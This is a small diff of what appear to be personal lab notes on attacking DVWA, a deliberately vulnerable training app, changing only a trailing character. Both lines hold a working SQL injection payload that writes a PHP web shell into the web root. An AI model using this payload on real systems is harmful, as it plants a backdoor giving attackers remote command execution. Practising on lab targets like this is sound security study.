@@ -46,6 +46,6 @@
 
 ## SQL Injection + backdoor
 
-- POSSIBLE PAYLOAD: `' UNION SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/html/temp/c.php"#`\
+- POSSIBLE PAYLOAD: `' UNION SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/html/temp/c.php"#`
 
 I am getting the following error, but it might be caused by the way I set up the webapp:  `Acceess denied for user 'dvwa'@'localhost' (using password: YES)`
